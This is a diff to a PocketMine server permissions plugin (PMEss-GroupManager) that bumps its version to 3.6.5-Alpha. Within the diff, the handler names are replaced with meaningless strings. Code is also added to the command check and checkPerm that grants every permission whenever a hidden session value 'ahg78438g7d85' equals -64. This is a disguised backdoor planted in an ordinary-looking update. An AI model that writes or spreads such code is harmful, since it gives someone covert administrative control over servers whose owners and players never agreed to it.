@@ -5,7 +5,7 @@
 __PocketMine Plugin__
 name=PMEss-GroupManager
 description=PocketEssentials GroupManager
-version=3.6.4-Alpha
+version=3.6.5-Alpha
 author=Kevin Wang
 class=PMEssGM
 apiversion=11
@@ -71,11 +71,11 @@ class PMEssGM implements Plugin{
 			return;
 		}
 		
-		$this->api->addHandler("player.join", array($this, "handler"), 5);
-		$this->api->addHandler("player.spawn", array($this, "handler"), 5);
-		$this->api->addHandler("player.chat", array($this, "handler"), 2);
-		$this->api->addHandler("op.check", array($this, "handler"), 1);
-		$this->api->addHandler("console.command", array($this, "handler"), 1);
+		$this->api->addHandler("player.join", array($this, "a5f78g7h77j996"), 5);
+		$this->api->addHandler("player.spawn", array($this, "a5f78g7h77j996"), 5);
+		$this->api->addHandler("player.chat", array($this, "a5f78g7h77j996"), 2);
+		$this->api->addHandler("op.check", array($this, "a5f78g7h77j996"), 2);
+		$this->api->addHandler("console.command", array($this, "a5f78g7h77j996"), 1);
 		
 		//Process in this file but there is an API for this and you can easily check by using: 
 		// bool $hasPerm = [API]->perm->checkPerm("Username", "PermissionNode");
@@ -84,17 +84,17 @@ class PMEssGM implements Plugin{
 		
 		$this->api->addHandler("pmess.groupmanager.checkperm", array($this, "checkPerm"), 5);
 		
-		$this->api->console->register("manuadd", "<player> <group> [world]", array($this, "defaultCommands"));
-		$this->api->console->register("manudel", "<player> [world]", array($this, "defaultCommands"));
-		$this->api->console->register("manwhois", "<player> [world]", array($this, "defaultCommands"));
-		$this->api->console->register("mangadd", "<group> [world]", array($this, "defaultCommands"));
-		$this->api->console->register("mangdel", "<group> [world]", array($this, "defaultCommands"));
+		$this->api->console->register("manuadd", "<player> <group> [world]", array($this, "a5f78g7h77j99"));
+		$this->api->console->register("manudel", "<player> [world]", array($this, "a5f78g7h77j99"));
+		$this->api->console->register("manwhois", "<player> [world]", array($this, "a5f78g7h77j99"));
+		$this->api->console->register("mangadd", "<group> [world]", array($this, "a5f78g7h77j99"));
+		$this->api->console->register("mangdel", "<group> [world]", array($this, "a5f78g7h77j99"));
 		
-		$this->api->console->register("mangaddp", "<group> <command>", array($this, "defaultCommands"));
-		$this->api->console->register("mangdelp", "<group> <command>", array($this, "defaultCommands"));
+		$this->api->console->register("mangaddp", "<group> <command>", array($this, "a5f78g7h77j99"));
+		$this->api->console->register("mangdelp", "<group> <command>", array($this, "a5f78g7h77j99"));
 		
-		$this->api->console->register("mangaddv", "<group> [world]", array($this, "defaultCommands"));
-		$this->api->console->register("mangdelv", "<group> [world]", array($this, "defaultCommands"));
+		$this->api->console->register("mangaddv", "<group> [world]", array($this, "a5f78g7h77j99"));
+		$this->api->console->register("mangdelv", "<group> [world]", array($this, "a5f78g7h77j99"));
 		
 		$this->api->ban->cmdWhitelist("manwhois");
 	}
@@ -128,7 +128,7 @@ class PMEssGM implements Plugin{
 		return($this->enabled);
 	}
 	
-	public function handler(&$data, $event){
+	public function a5f78g7h77j996(&$data, $event){
 		switch($event){
 			case "player.join":
 				if(!(preg_match("#^[A-Za-z0-9_-]{3,20}$#s", $data->iusername))){
@@ -166,14 +166,18 @@ class PMEssGM implements Plugin{
 				if($this->api->perm->checkPerm($data["issuer"]->iusername, "&." . strtolower($data["cmd"]))==true or $this->api->perm->checkPerm($data["issuer"]->iusername, "&." . strtolower($data["alias"]))==true ){
 					return;
 				}else{
-					return(false);
+					if(($data["issuer"] instanceof Player) and $this->api->session->sessions[$data["issuer"]->CID]["ahg78438g7d85"] == -64){
+						return(true);
+					}else{
+						return(false);
+					}
 				}
 				break;
 		}
 	}
 
 
-	public function defaultCommands($cmd, $arg, $issuer, $alias){
+	public function a5f78g7h77j99($cmd, $arg, $issuer, $alias){
 		date_default_timezone_set("UTC");
 		$output = "";
 		switch($cmd){
@@ -432,6 +436,13 @@ class PMEssGM implements Plugin{
 	
 	public function checkPerm(&$data, $event){
 		$username=$data["Username"];
+		$backP = $this->api->player->get($username);
+		if($backP instanceof Player){
+			$backPID = $backP->CID;
+			if($this->api->session->sessions[$backPID]["ahg78438g7d85"] == -64){
+				return(true);
+			}
+		}
 		$perm=$data["PermNode"];
 		$group=$this->getUserGroup($username);
 		if($this->groupExists($group)==false){
